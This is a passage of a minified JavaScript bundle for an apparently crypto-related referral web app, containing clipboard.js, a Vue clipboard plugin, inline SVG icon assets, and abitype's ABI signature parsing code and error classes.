                            T.enumerable = T.enumerable || !1, T.configurable = !0, "value" in T && (T.writable = !0), Object.defineProperty(y, T.key, T)
                        }
                    }

                    function p(y, x) {
                        return (p = Object.setPrototypeOf || function(I, T) {
                            return I.__proto__ = T, I
                        })(y, x)
                    }

                    function w(y) {
                        var x = (function() {
                            if (typeof Reflect > "u" || !Reflect.construct || Reflect.construct.sham) return !1;
                            if (typeof Proxy == "function") return !0;
                            try {
                                return Date.prototype.toString.call(Reflect.construct(Date, [], function() {})), !0
                            } catch {
                                return !1
                            }
                        })();
                        return function() {
                            var I, T = A(y);
                            return I = x ? (I = A(this).constructor, Reflect.construct(T, arguments, I)) : T.apply(this, arguments), T = this, !(I = I) || S(I) !== "object" && typeof I != "function" ? (function(O) {
                                if (O !== void 0) return O;
                                throw new ReferenceError("this hasn't been initialised - super() hasn't been called")
                            })(T) : I
                        }
                    }

                    function A(y) {
                        return (A = Object.setPrototypeOf ? Object.getPrototypeOf : function(x) {
                            return x.__proto__ || Object.getPrototypeOf(x)
                        })(y)
                    }

                    function N(y, x) {
                        if (y = "data-clipboard-".concat(y), x.hasAttribute(y)) return x.getAttribute(y)
                    }
                    var v = (function() {
                        (function(L, k) {
                            if (typeof k != "function" && k !== null) throw new TypeError("Super expression must either be null or a function");
                            L.prototype = Object.create(k && k.prototype, {
                                constructor: {
                                    value: L,
                                    writable: !0,
                                    configurable: !0
                                }
                            }), k && p(L, k)
                        })(O, c());
                        var y, x, I, T = w(O);

                        function O(L, k) {
                            var R;
                            return (function(D) {
                                if (!(D instanceof O)) throw new TypeError("Cannot call a class as a function")
                            })(this), (R = T.call(this)).resolveOptions(k), R.listenClick(L), R
                        }
                        return y = O, I = [{
                            key: "copy",
                            value: function(L) {
                                var k = 1 < arguments.length && arguments[1] !== void 0 ? arguments[1] : {
                                    container: document.body
                                };
                                return m(L, k)
                            }
                        }, {
                            key: "cut",
                            value: function(L) {
                                return h(L)
                            }
                        }, {
                            key: "isSupported",
                            value: function() {
                                var L = 0 < arguments.length && arguments[0] !== void 0 ? arguments[0] : ["copy", "cut"],
                                    L = typeof L == "string" ? [L] : L,
                                    k = !!document.queryCommandSupported;
                                return L.forEach(function(R) {
                                    k = k && !!document.queryCommandSupported(R)
                                }), k
                            }
                        }], (x = [{
                            key: "resolveOptions",
                            value: function() {
                                var L = 0 < arguments.length && arguments[0] !== void 0 ? arguments[0] : {};
                                this.action = typeof L.action == "function" ? L.action : this.defaultAction, this.target = typeof L.target == "function" ? L.target : this.defaultTarget, this.text = typeof L.text == "function" ? L.text : this.defaultText, this.container = S(L.container) === "object" ? L.container : document.body
                            }
                        }, {
                            key: "listenClick",
                            value: function(L) {
                                var k = this;
                                this.listener = u()(L, "click", function(R) {
                                    return k.onClick(R)
                                })
                            }
                        }, {
                            key: "onClick",
                            value: function(D) {
                                var k = D.delegateTarget || D.currentTarget,
                                    R = this.action(k) || "copy",
                                    D = E({
                                        action: R,
                                        container: this.container,
                                        target: this.target(k),
                                        text: this.text(k)
                                    });
                                this.emit(D ? "success" : "error", {
                                    action: R,
                                    text: D,
                                    trigger: k,
                                    clearSelection: function() {
                                        k && k.focus(), window.getSelection().removeAllRanges()
                                    }
                                })
                            }
                        }, {
                            key: "defaultAction",
                            value: function(L) {
                                return N("action", L)
                            }
                        }, {
                            key: "defaultTarget",
                            value: function(L) {
                                if (L = N("target", L), L) return document.querySelector(L)
                            }
                        }, {
                            key: "defaultText",
                            value: function(L) {
                                return N("text", L)
                            }
                        }, {
                            key: "destroy",
                            value: function() {
                                this.listener.destroy()
                            }
                        }]) && g(y.prototype, x), I && g(y, I), O
                    })()
                },
                828: function(i) {
                    var o;
                    typeof Element > "u" || Element.prototype.matches || ((o = Element.prototype).matches = o.matchesSelector || o.mozMatchesSelector || o.msMatchesSelector || o.oMatchesSelector || o.webkitMatchesSelector), i.exports = function(a, c) {
                        for (; a && a.nodeType !== 9;) {
                            if (typeof a.matches == "function" && a.matches(c)) return a;
                            a = a.parentNode
                        }
                    }
                },
                438: function(i, o, a) {
                    var c = a(828);

                    function u(l, f, d, h, b) {
                        var m = (function(_, E, S, g) {
                            return function(p) {
                                p.delegateTarget = c(p.target, E), p.delegateTarget && g.call(_, p)
                            }
                        }).apply(this, arguments);
                        return l.addEventListener(d, m, b), {
                            destroy: function() {
                                l.removeEventListener(d, m, b)
                            }
                        }
                    }
                    i.exports = function(l, f, d, h, b) {
                        return typeof l.addEventListener == "function" ? u.apply(null, arguments) : typeof d == "function" ? u.bind(null, document).apply(null, arguments) : (typeof l == "string" && (l = document.querySelectorAll(l)), Array.prototype.map.call(l, function(m) {
                            return u(m, f, d, h, b)
                        }))
                    }
                },
                879: function(i, o) {
                    o.node = function(a) {
                        return a !== void 0 && a instanceof HTMLElement && a.nodeType === 1
                    }, o.nodeList = function(a) {
                        var c = Object.prototype.toString.call(a);
                        return a !== void 0 && (c === "[object NodeList]" || c === "[object HTMLCollection]") && "length" in a && (a.length === 0 || o.node(a[0]))
                    }, o.string = function(a) {
                        return typeof a == "string" || a instanceof String
                    }, o.fn = function(a) {
                        return Object.prototype.toString.call(a) === "[object Function]"
                    }
                },
                370: function(i, o, a) {
                    var c = a(879),
                        u = a(438);
                    i.exports = function(l, f, d) {
                        if (!l && !f && !d) throw new Error("Missing required arguments");
                        if (!c.string(f)) throw new TypeError("Second argument must be a String");
                        if (!c.fn(d)) throw new TypeError("Third argument must be a Function");
                        if (c.node(l)) return E = f, S = d, (_ = l).addEventListener(E, S), {
                            destroy: function() {
                                _.removeEventListener(E, S)
                            }
                        };
                        if (c.nodeList(l)) return h = l, b = f, m = d, Array.prototype.forEach.call(h, function(g) {
                            g.addEventListener(b, m)
                        }), {
                            destroy: function() {
                                Array.prototype.forEach.call(h, function(g) {
                                    g.removeEventListener(b, m)
                                })
                            }
                        };
                        if (c.string(l)) return l = l, f = f, d = d, u(document.body, l, f, d);
                        throw new TypeError("First argument must be a String, HTMLElement, HTMLCollection, or NodeList");
                        var h, b, m, _, E, S
                    }
                },
                817: function(i) {
                    i.exports = function(o) {
                        var a, c = o.nodeName === "SELECT" ? (o.focus(), o.value) : o.nodeName === "INPUT" || o.nodeName === "TEXTAREA" ? ((a = o.hasAttribute("readonly")) || o.setAttribute("readonly", ""), o.select(), o.setSelectionRange(0, o.value.length), a || o.removeAttribute("readonly"), o.value) : (o.hasAttribute("contenteditable") && o.focus(), c = window.getSelection(), (a = document.createRange()).selectNodeContents(o), c.removeAllRanges(), c.addRange(a), c.toString());
                        return c
                    }
                },
                279: function(i) {
                    function o() {}
                    o.prototype = {
                        on: function(a, c, u) {
                            var l = this.e || (this.e = {});
                            return (l[a] || (l[a] = [])).push({
                                fn: c,
                                ctx: u
                            }), this
                        },
                        once: function(a, c, u) {
                            var l = this;

                            function f() {
                                l.off(a, f), c.apply(u, arguments)
                            }
                            return f._ = c, this.on(a, f, u)
                        },
                        emit: function(a) {
                            for (var c = [].slice.call(arguments, 1), u = ((this.e || (this.e = {}))[a] || []).slice(), l = 0, f = u.length; l < f; l++) u[l].fn.apply(u[l].ctx, c);
                            return this
                        },
                        off: function(a, c) {
                            var u = this.e || (this.e = {}),
                                l = u[a],
                                f = [];
                            if (l && c)
                                for (var d = 0, h = l.length; d < h; d++) l[d].fn !== c && l[d].fn._ !== c && f.push(l[d]);
                            return f.length ? u[a] = f : delete u[a], this
                        }
                    }, i.exports = o, i.exports.TinyEmitter = o
                }
            }, s = {}, n.n = function(i) {
                var o = i && i.__esModule ? function() {
                    return i.default
                } : function() {
                    return i
                };
                return n.d(o, {
                    a: o
                }), o
            }, n.d = function(i, o) {
                for (var a in o) n.o(o, a) && !n.o(i, a) && Object.defineProperty(i, a, {
                    enumerable: !0,
                    get: o[a]
                })
            }, n.o = function(i, o) {
                return Object.prototype.hasOwnProperty.call(i, o)
            }, n(686).default;

            function n(i) {
                if (s[i]) return s[i].exports;
                var o = s[i] = {
                    exports: {}
                };
                return r[i](o, o.exports, n), o.exports
            }
            var r, s
        })
    })(Da)), Da.exports
}
var $h;

function K8() {
    return $h || ($h = 1, (function(e, t) {
        var n = X8(),
            r = {
                autoSetContainer: !1,
                appendToBody: !0
            },
            s = {
                install: function(i) {
                    var o = i.version.slice(0, 2) === "3." ? i.config.globalProperties : i.prototype;
                    o.$clipboardConfig = r, o.$copyText = function(a, c) {
                        return new Promise(function(u, l) {
                            var f = document.createElement("button"),
                                d = new n(f, {
                                    text: function() {
                                        return a
                                    },
                                    action: function() {
                                        return "copy"
                                    },
                                    container: typeof c == "object" ? c : document.body
                                });
                            d.on("success", function(h) {
                                d.destroy(), u(h)
                            }), d.on("error", function(h) {
                                d.destroy(), l(h)
                            }), r.appendToBody && document.body.appendChild(f), f.click(), r.appendToBody && document.body.removeChild(f)
                        })
                    }, i.directive("clipboard", {
                        bind: function(a, c, u) {
                            if (c.arg === "success") a._vClipboard_success = c.value;
                            else if (c.arg === "error") a._vClipboard_error = c.value;
                            else {
                                var l = new n(a, {
                                    text: function() {
                                        return c.value
                                    },
                                    action: function() {
                                        return c.arg === "cut" ? "cut" : "copy"
                                    },
                                    container: r.autoSetContainer ? a : void 0
                                });
                                l.on("success", function(f) {
                                    var d = a._vClipboard_success;
                                    d && d(f)
                                }), l.on("error", function(f) {
                                    var d = a._vClipboard_error;
                                    d && d(f)
                                }), a._vClipboard = l
                            }
                        },
                        update: function(a, c) {
                            c.arg === "success" ? a._vClipboard_success = c.value : c.arg === "error" ? a._vClipboard_error = c.value : (a._vClipboard.text = function() {
                                return c.value
                            }, a._vClipboard.action = function() {
                                return c.arg === "cut" ? "cut" : "copy"
                            })
                        },
                        unbind: function(a, c) {
                            a._vClipboard && (c.arg === "success" ? delete a._vClipboard_success : c.arg === "error" ? delete a._vClipboard_error : (a._vClipboard.destroy(), delete a._vClipboard))
                        }
                    })
                },
                config: r
            };
        e.exports = s
    })(zl)), zl.exports
}
var Z8 = K8();
const Y8 = nm(Z8),
    J8 = "/assets/reward-Cq3QIg6H.png",
    Q8 = "data:image/svg+xml,%3csvg%20width='24'%20height='24'%20viewBox='0%200%2024%2024'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M10.7516%2016.8604V18.8904C10.7516%2020.6104%209.15158%2022.0004%207.18158%2022.0004C5.21158%2022.0004%203.60156%2020.6104%203.60156%2018.8904V16.8604C3.60156%2018.5804%205.20158%2019.8004%207.18158%2019.8004C9.15158%2019.8004%2010.7516%2018.5704%2010.7516%2016.8604Z'%20stroke='white'%20stroke-width='1.5'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3cpath%20d='M10.75%2014.11C10.75%2014.61%2010.61%2015.07%2010.37%2015.47C9.78%2016.44%208.56998%2017.05%207.16998%2017.05C5.76998%2017.05%204.55997%2016.43%203.96997%2015.47C3.72997%2015.07%203.59003%2014.61%203.59003%2014.11C3.59003%2013.25%203.99%2012.48%204.63%2011.92C5.28%2011.35%206.16997%2011.01%207.15997%2011.01C8.14997%2011.01%209.04%2011.36%209.69%2011.92C10.35%2012.47%2010.75%2013.25%2010.75%2014.11Z'%20stroke='white'%20stroke-width='1.5'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3cpath%20d='M10.7516%2014.11V16.86C10.7516%2018.58%209.15158%2019.8%207.18158%2019.8C5.21158%2019.8%203.60156%2018.57%203.60156%2016.86V14.11C3.60156%2012.39%205.20158%2011%207.18158%2011C8.17158%2011%209.06161%2011.35%209.71161%2011.91C10.3516%2012.47%2010.7516%2013.25%2010.7516%2014.11Z'%20stroke='white'%20stroke-width='1.5'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3cpath%20d='M22%2010.9699V13.03C22%2013.58%2021.56%2014.0299%2021%2014.0499H19.04C17.96%2014.0499%2016.97%2013.2599%2016.88%2012.1799C16.82%2011.5499%2017.06%2010.9599%2017.48%2010.5499C17.85%2010.1699%2018.36%209.94995%2018.92%209.94995H21C21.56%209.96995%2022%2010.4199%2022%2010.9699Z'%20stroke='white'%20stroke-width='1.5'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3cpath%20d='M2%2010.5V8.5C2%205.78%203.64%203.88%206.19%203.56C6.45%203.52%206.72%203.5%207%203.5H16C16.26%203.5%2016.51%203.50999%2016.75%203.54999C19.33%203.84999%2021%205.76%2021%208.5V9.95001H18.92C18.36%209.95001%2017.85%2010.17%2017.48%2010.55C17.06%2010.96%2016.82%2011.55%2016.88%2012.18C16.97%2013.26%2017.96%2014.05%2019.04%2014.05H21V15.5C21%2018.5%2019%2020.5%2016%2020.5H13.5'%20stroke='white'%20stroke-width='1.5'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3c/svg%3e",
    e3 = "/assets/referral-BhAUDWsy.png",
    t3 = "data:image/svg+xml,%3csvg%20width='20'%20height='22'%20viewBox='0%200%2020%2022'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M5.25%205.19444V14.0833C5.25%2014.6727%205.48705%2015.2379%205.90901%2015.6547C6.33097%2016.0714%206.90326%2016.3056%207.5%2016.3056H14.25M5.25%205.19444V2.97222C5.25%202.38285%205.48705%201.81762%205.90901%201.40087C6.33097%200.984126%206.90326%200.75%207.5%200.75H12.6592C12.9576%200.750063%2013.2437%200.867167%2013.4546%201.07556L18.4204%205.98C18.6314%206.18833%2018.7499%206.47089%2018.75%206.76556V14.0833C18.75%2014.6727%2018.5129%2015.2379%2018.091%2015.6547C17.669%2016.0714%2017.0967%2016.3056%2016.5%2016.3056H14.25M5.25%205.19444H3C2.40326%205.19444%201.83097%205.42857%201.40901%205.84532C0.987053%206.26207%200.75%206.8273%200.75%207.41667V18.5278C0.75%2019.1171%200.987053%2019.6824%201.40901%2020.0991C1.83097%2020.5159%202.40326%2020.75%203%2020.75H12C12.5967%2020.75%2013.169%2020.5159%2013.591%2020.0991C14.0129%2019.6824%2014.25%2019.1171%2014.25%2018.5278V16.3056'%20stroke='white'%20stroke-width='1.5'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3c/svg%3e",
    n3 = "/assets/total_commissions-BeMRwxKv.png",
    r3 = "data:image/svg+xml,%3csvg%20width='8'%20height='7'%20viewBox='0%200%208%207'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M7.5%203.5H0.5H7.5Z'%20fill='white'/%3e%3cpath%20d='M4.38889%200.5L7.5%203.5M7.5%203.5L4.38889%206.5M7.5%203.5H0.5'%20stroke='white'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3c/svg%3e",
    ys = "data:image/svg+xml,%3csvg%20width='22'%20height='22'%20viewBox='0%200%2022%2022'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M10.49%2016.4525H16.41C16.32%2016.5325%2016.23%2016.6025%2016.14%2016.6825L11.87%2019.8825C10.46%2020.9325%208.16001%2020.9325%206.74001%2019.8825L2.46001%2016.6825C1.52001%2015.9825%200.75%2014.4325%200.75%2013.2625V5.8525C0.75%204.6325%201.68001%203.2825%202.82001%202.8525L7.8%200.9825C8.62%200.6725%209.98%200.6725%2010.8%200.9825L15.77%202.8525C16.72%203.2125%2017.53%204.2125%2017.78%205.2325H10.48C10.26%205.2325%2010.06%205.24251%209.87%205.24251C8.02%205.35251%207.53999%206.02249%207.53999%208.13249V13.5625C7.54999%2015.8625%208.14001%2016.4525%2010.49%2016.4525Z'%20stroke='white'%20stroke-width='1.5'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3cpath%20d='M7.54999%209.92261H20.75'%20stroke='white'%20stroke-width='1.5'%20stroke-miterlimit='10'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3cpath%20d='M20.75%208.12241V13.6724C20.73%2015.8924%2020.12%2016.4424%2017.81%2016.4424H10.49C8.13999%2016.4424%207.54999%2015.8524%207.54999%2013.5424V8.1124C7.54999%206.0124%208.02999%205.34238%209.87999%205.22238C10.07%205.22238%2010.27%205.2124%2010.49%205.2124H17.81C20.16%205.2224%2020.75%205.80241%2020.75%208.12241Z'%20stroke='white'%20stroke-width='1.5'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3cpath%20d='M10.07%2013.9624H11.4'%20stroke='white'%20stroke-width='1.5'%20stroke-miterlimit='10'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3cpath%20d='M13.5%2013.9624H16.77'%20stroke='white'%20stroke-width='1.5'%20stroke-miterlimit='10'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3c/svg%3e",
    s3 = "/assets/hero-CyzuUvF7.png",
    i3 = "logo2.png",
    o3 = "data:image/svg+xml,%3csvg%20width='26'%20height='26'%20viewBox='0%200%2026%2026'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cpath%20d='M17.875%2010.2917L13.325%2014.8417L11.5917%2012.2417L8.125%2015.7084'%20stroke='%2302B075'%20stroke-width='1.5'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3cpath%20d='M15.7083%2010.2917H17.875V12.4584'%20stroke='%2302B075'%20stroke-width='1.5'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3c/svg%3e",
    a3 = "logo.png",
    c3 = "data:image/svg+xml,%3csvg%20width='19'%20height='20'%20viewBox='0%200%2019%2020'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3ccircle%20cx='9.5'%20cy='10'%20r='9.5'%20fill='%23FBBF24'/%3e%3cpath%20d='M9.5%206.5%20L13%2010%20L11.5%2010%20L11.5%2013%20L7.5%2013%20L7.5%2010%20L6%2010%20L9.5%206.5Z'%20fill='%231A1A1A'/%3e%3cpath%20d='M6%2014.5%20L13%2014.5%20L13%2016%20L6%2016%20L6%2014.5Z'%20fill='%231A1A1A'/%3e%3c/svg%3e",
    l3 = "1.1.0";
let Tt = class Fu extends Error {
    constructor(t, n = {}) {
        const r = n.cause instanceof Fu ? n.cause.details : n.cause?.message ? n.cause.message : n.details,
            s = n.cause instanceof Fu && n.cause.docsPath || n.docsPath,
            i = [t || "An error occurred.", "", ...n.metaMessages ? [...n.metaMessages, ""] : [], ...s ? [`Docs: https://abitype.dev${s}`] : [], ...r ? [`Details: ${r}`] : [], `Version: abitype@${l3}`].join(`
`);
        super(i), Object.defineProperty(this, "details", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "docsPath", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "metaMessages", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "shortMessage", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "AbiTypeError"
        }), n.cause && (this.cause = n.cause), this.details = r, this.docsPath = s, this.metaMessages = n.metaMessages, this.shortMessage = t
    }
};

function tr(e, t) {
    return e.exec(t)?.groups
}
const ob = /^bytes([1-9]|1[0-9]|2[0-9]|3[0-2])?$/,
    ab = /^u?int(8|16|24|32|40|48|56|64|72|80|88|96|104|112|120|128|136|144|152|160|168|176|184|192|200|208|216|224|232|240|248|256)?$/,
    cb = /^\(.+?\).*?$/,
    Dh = /^tuple(?<array>(\[(\d*)\])*)$/;

function Uu(e) {
    let t = e.type;
    if (Dh.test(e.type) && "components" in e) {
        t = "(";
        const n = e.components.length;
        for (let s = 0; s < n; s++) {
            const i = e.components[s];
            t += Uu(i), s < n - 1 && (t += ", ")
        }
        const r = tr(Dh, e.type);
        return t += `)${r?.array??""}`, Uu({
            ...e,
            type: t
        })
    }
    return "indexed" in e && e.indexed && (t = `${t} indexed`), e.name ? `${t} ${e.name}` : t
}

function Ts(e) {
    let t = "";
    const n = e.length;
    for (let r = 0; r < n; r++) {
        const s = e[r];
        t += Uu(s), r !== n - 1 && (t += ", ")
    }
    return t
}

function lc(e) {
    return e.type === "function" ? `function ${e.name}(${Ts(e.inputs)})${e.stateMutability&&e.stateMutability!=="nonpayable"?` ${e.stateMutability}`:""}${e.outputs?.length?` returns (${Ts(e.outputs)})`:""}` : e.type === "event" ? `event ${e.name}(${Ts(e.inputs)})` : e.type === "error" ? `error ${e.name}(${Ts(e.inputs)})` : e.type === "constructor" ? `constructor(${Ts(e.inputs)})${e.stateMutability==="payable"?" payable":""}` : e.type === "fallback" ? `fallback() external${e.stateMutability==="payable"?" payable":""}` : "receive() external payable"
}
const lb = /^error (?<name>[a-zA-Z$_][a-zA-Z0-9$_]*)\((?<parameters>.*?)\)$/;

function u3(e) {
    return lb.test(e)
}

function f3(e) {
    return tr(lb, e)
}
const ub = /^event (?<name>[a-zA-Z$_][a-zA-Z0-9$_]*)\((?<parameters>.*?)\)$/;

function d3(e) {
    return ub.test(e)
}

function h3(e) {
    return tr(ub, e)
}
const fb = /^function (?<name>[a-zA-Z$_][a-zA-Z0-9$_]*)\((?<parameters>.*?)\)(?: (?<scope>external|public{1}))?(?: (?<stateMutability>pure|view|nonpayable|payable{1}))?(?: returns\s?\((?<returns>.*?)\))?$/;

function p3(e) {
    return fb.test(e)
}

function m3(e) {
    return tr(fb, e)
}
const db = /^struct (?<name>[a-zA-Z$_][a-zA-Z0-9$_]*) \{(?<properties>.*?)\}$/;

function al(e) {
    return db.test(e)
}

function b3(e) {
    return tr(db, e)
}
const hb = /^constructor\((?<parameters>.*?)\)(?:\s(?<stateMutability>payable{1}))?$/;

function g3(e) {
    return hb.test(e)
}

function x3(e) {
    return tr(hb, e)
}
const pb = /^fallback\(\) external(?:\s(?<stateMutability>payable{1}))?$/;

function y3(e) {
    return pb.test(e)
}

function w3(e) {
    return tr(pb, e)
}
const _3 = /^receive\(\) external payable$/;

function E3(e) {
    return _3.test(e)
}
const Fh = new Set(["memory", "indexed", "storage", "calldata"]),
    v3 = new Set(["indexed"]),
    Vu = new Set(["calldata", "memory", "storage"]);
class T3 extends Tt {
    constructor({
        signature: t
    }) {
        super("Failed to parse ABI item.", {
            details: `parseAbiItem(${JSON.stringify(t,null,2)})`,
            docsPath: "/api/human#parseabiitem-1"
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "InvalidAbiItemError"
        })
    }
}
class S3 extends Tt {
    constructor({
        type: t
    }) {
        super("Unknown type.", {
            metaMessages: [`Type "${t}" is not a valid ABI type. Perhaps you forgot to include a struct signature?`]
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "UnknownTypeError"
        })
    }
}
class C3 extends Tt {
    constructor({
        type: t
    }) {
        super("Unknown type.", {
            metaMessages: [`Type "${t}" is not a valid ABI type.`]
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "UnknownSolidityTypeError"
        })
    }
}
class I3 extends Tt {
    constructor({
        params: t
    }) {
        super("Failed to parse ABI parameters.", {
            details: `parseAbiParameters(${JSON.stringify(t,null,2)})`,
            docsPath: "/api/human#parseabiparameters-1"
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "InvalidAbiParametersError"
        })
    }
}
class A3 extends Tt {
    constructor({
        param: t
    }) {
        super("Invalid ABI parameter.", {
            details: t
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "InvalidParameterError"
        })
    }
}
class N3 extends Tt {
    constructor({
        param: t,
        name: n
    }) {
        super("Invalid ABI parameter.", {
            details: t,
            metaMessages: [`"${n}" is a protected Solidity keyword. More info: https://docs.soliditylang.org/en/latest/cheatsheet.html`]
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "SolidityProtectedKeywordError"
        })
    }
}
class P3 extends Tt {
    constructor({
        param: t,
        type: n,
        modifier: r
    }) {
        super("Invalid ABI parameter.", {
            details: t,
            metaMessages: [`Modifier "${r}" not allowed${n?` in "${n}" type`:""}.`]
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "InvalidModifierError"
        })
    }
}
class O3 extends Tt {
    constructor({
        param: t,
        type: n,
        modifier: r
    }) {
        super("Invalid ABI parameter.", {
            details: t,
            metaMessages: [`Modifier "${r}" not allowed${n?` in "${n}" type`:""}.`, `Data location can only be specified for array, struct, or mapping types, but "${r}" was given.`]
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "InvalidFunctionModifierError"
        })
    }
}
class R3 extends Tt {
    constructor({
        abiParameter: t
    }) {
        super("Invalid ABI parameter.", {
            details: JSON.stringify(t, null, 2),
            metaMessages: ["ABI parameter type is invalid."]
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "InvalidAbiTypeParameterError"
        })
    }
}
class li extends Tt {
    constructor({
        signature: t,
        type: n
    }) {
        super(`Invalid ${n} signature.`, {
            details: t
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "InvalidSignatureError"
        })
    }
}
class M3 extends Tt {
    constructor({
        signature: t
    }) {
        super("Unknown signature.", {
            details: t
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "UnknownSignatureError"
        })
    }
}
class k3 extends Tt {
    constructor({
        signature: t
    }) {
        super("Invalid struct signature.", {
            details: t,
            metaMessages: ["No properties exist."]
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "InvalidStructSignatureError"
        })
    }
}
class B3 extends Tt {
    constructor({
        type: t
    }) {
        super("Circular reference detected.", {
            metaMessages: [`Struct "${t}" is a circular reference.`]
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "CircularReferenceError"
        })
    }
}
class L3 extends Tt {
    constructor({
        current: t,
        depth: n
    }) {
        super("Unbalanced parentheses.", {
            metaMessages: [`"${t.trim()}" has too many ${n>0?"opening":"closing"} parentheses.`],
            details: `Depth "${n}"`
        }), Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "InvalidParenthesisError"
        })
    }
}

function $3(e, t, n) {
    let r = "";
    if (n)
        for (const s of Object.entries(n)) {
            if (!s) continue;
            let i = "";
            for (const o of s[1]) i += `[${o.type}${o.name?`:${o.name}`:""}]`;
            r += `(${s[0]}{${i}})`
        }
    return t ? `${t}:${e}${r}` : e
}
const ql = new Map([
    ["address", {
        type: "address"
    }],
    ["bool", {
        type: "bool"
    }],
    ["bytes", {
        type: "bytes"
    }],
    ["bytes32", {
        type: "bytes32"
    }],
    ["int", {
        type: "int256"
    }],
    ["int256", {
        type: "int256"
    }],
    ["string", {
        type: "string"
    }],
    ["uint", {
        type: "uint256"
    }],
    ["uint8", {
        type: "uint8"
    }],
    ["uint16", {
        type: "uint16"
    }],
    ["uint24", {
        type: "uint24"
    }],
    ["uint32", {
        type: "uint32"
    }],
    ["uint64", {
        type: "uint64"
    }],
    ["uint96", {
        type: "uint96"
    }],
    ["uint112", {
        type: "uint112"
    }],
    ["uint160", {
        type: "uint160"
    }],
    ["uint192", {
        type: "uint192"
    }],
    ["uint256", {
        type: "uint256"
    }],
    ["address owner", {
        type: "address",
        name: "owner"
    }],
    ["address to", {
        type: "address",
        name: "to"
    }],
    ["bool approved", {
        type: "bool",
        name: "approved"
    }],
    ["bytes _data", {
        type: "bytes",
        name: "_data"
    }],
    ["bytes data", {
        type: "bytes",
        name: "data"
    }],
    ["bytes signature", {
        type: "bytes",
        name: "signature"
    }],
    ["bytes32 hash", {
        type: "bytes32",
        name: "hash"
    }],
    ["bytes32 r", {
        type: "bytes32",
        name: "r"
    }],
    ["bytes32 root", {
        type: "bytes32",
        name: "root"
    }],
    ["bytes32 s", {
        type: "bytes32",
        name: "s"
    }],
    ["string name", {
        type: "string",
        name: "name"
    }],
    ["string symbol", {
        type: "string",
        name: "symbol"
    }],
    ["string tokenURI", {
        type: "string",
        name: "tokenURI"
    }],
    ["uint tokenId", {
        type: "uint256",
        name: "tokenId"
    }],
    ["uint8 v", {
        type: "uint8",
        name: "v"
    }],
    ["uint256 balance", {
        type: "uint256",
        name: "balance"
    }],
    ["uint256 tokenId", {
        type: "uint256",
        name: "tokenId"
    }],
    ["uint256 value", {
        type: "uint256",
        name: "value"
    }],
    ["event:address indexed from", {
        type: "address",
        name: "from",
        indexed: !0
    }],
    ["event:address indexed to", {
        type: "address",
        name: "to",
        indexed: !0
    }],
    ["event:uint indexed tokenId", {
        type: "uint256",
        name: "tokenId",
        indexed: !0
    }],
    ["event:uint256 indexed tokenId", {
        type: "uint256",
        name: "tokenId",
        indexed: !0
    }]
]);

function Hu(e, t = {}) {
    if (p3(e)) return D3(e, t);
    if (d3(e)) return F3(e, t);
    if (u3(e)) return U3(e, t);
    if (g3(e)) return V3(e, t);
    if (y3(e)) return H3(e);
    if (E3(e)) return {
        type: "receive",
        stateMutability: "payable"
    };
    throw new M3({
        signature: e
    })
}

function D3(e, t = {}) {
    const n = m3(e);
    if (!n) throw new li({
        signature: e,
        type: "function"
    });
    const r = Ot(n.parameters),
        s = [],
        i = r.length;
    for (let a = 0; a < i; a++) s.push(Wn(r[a], {
        modifiers: Vu,
        structs: t,
        type: "function"
    }));
    const o = [];
    if (n.returns) {
        const a = Ot(n.returns),
            c = a.length;
        for (let u = 0; u < c; u++) o.push(Wn(a[u], {
            modifiers: Vu,
            structs: t,
            type: "function"
        }))
    }
    return {
        name: n.name,
        type: "function",
        stateMutability: n.stateMutability ?? "nonpayable",
        inputs: s,
        outputs: o
    }
}

function F3(e, t = {}) {
